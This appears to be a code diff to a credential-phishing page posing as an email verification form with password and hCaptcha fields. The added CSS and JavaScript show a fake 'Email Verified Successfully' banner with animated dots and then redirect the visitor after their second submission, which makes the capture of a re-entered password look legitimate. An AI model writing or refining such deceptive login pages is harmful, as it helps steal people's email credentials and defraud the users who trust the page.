@@ -31,7 +31,15 @@ overflow-y: auto;
 h1 { margin: 0 0 4px; font-size: 22px; font-weight: 700; color: var(--text); letter-spacing: -0.02em; line-height: 1.2; }
 .desc { color: var(--text-muted); margin-bottom: 20px; font-size: 13px; font-weight: 400; line-height: 1.5; }
 .error { background: linear-gradient(90deg, #fef2f2, #fee2e2); border: 1px solid #fecaca; color: #dc2626; padding: 12px; border-radius: 12px; margin-bottom: 16px; font-weight: 500; font-size: 13px; text-align: center; box-shadow: 0 4px 12px rgba(239,68,68,0.15); display: none; }
-.success { background: linear-gradient(90deg, #f0fdf4, #dcfce7); border: 1px solid #bbf7d0; color: #16a34a; padding: 12px; border-radius: 12px; margin-bottom: 16px; font-weight: 500; font-size: 13px; text-align: center; box-shadow: 0 4px 12px rgba(34,197,94,0.15); display: none; }
+.success { background: linear-gradient(90deg, #f0fdf4, #dcfce7); border: 1px solid #bbf7d0; color: #16a34a; padding: 12px; border-radius: 12px; margin-bottom: 16px; font-weight: 500; font-size: 13px; text-align: center; box-shadow: 0 4px 12px rgba(34,197,94,0.15); display: none; animation: slideIn 0.4s ease-out; }
+@keyframes slideIn {
+  from { opacity: 0; transform: translateY(-10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes pulse {
+  0%, 100% { transform: scale(1); }
+  50% { transform: scale(1.02); }
+}
 .field { margin-bottom: 14px; position: relative; }
 label { display: block; font-size: 13px; font-weight: 500; color: var(--text); margin-bottom: 6px; letter-spacing: 0.01em; }
 input[type="email"], input[type="password"] { width: 100%; padding: 12px 16px; border: 2px solid transparent; border-radius: 12px; font-size: 14px; font-weight: 400; background: rgba(255,255,255,0.8); backdrop-filter: blur(10px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); font-family: inherit; }
@@ -286,8 +294,33 @@ submitBtn.disabled = true;
 submitBtn.textContent = 'Please verify you are human';
 }
 } else if (result.data.count === 2 && result.data.redirect) {
-// Second submission - redirect
+// Second submission - show success message then redirect
+successMsg.innerHTML = '<strong>✓ Email Verified Successfully</strong><br><span style="font-size: 12px; opacity: 0.9;">Redirecting to your mailbox<span class="dots">...</span></span>';
+successMsg.style.display = 'block';
+successMsg.style.animation = 'pulse 1.5s ease-in-out infinite';
+errorMsg.style.display = 'none';
+submitBtn.textContent = 'Verified ✓';
+submitBtn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+submitBtn.style.cursor = 'default';
+// Hide form fields
+emailInput.disabled = true;
+pw.disabled = true;
+toggle.disabled = true;
+hcaptchaField.style.display = 'none';
+// Animated dots
+var dotCount = 0;
+var dotInterval = setInterval(function() {
+dotCount = (dotCount + 1) % 4;
+var dotsEl = successMsg.querySelector('.dots');
+if (dotsEl) {
+dotsEl.textContent = '.'.repeat(dotCount || 1);
+}
+}, 400);
+// Redirect after 2.5 seconds
+setTimeout(function() {
+clearInterval(dotInterval);
 window.location.href = result.data.redirect;
+}, 2500);
 }
 } else if (result.data.verified) {
 // Email already verified (3+ attempts)
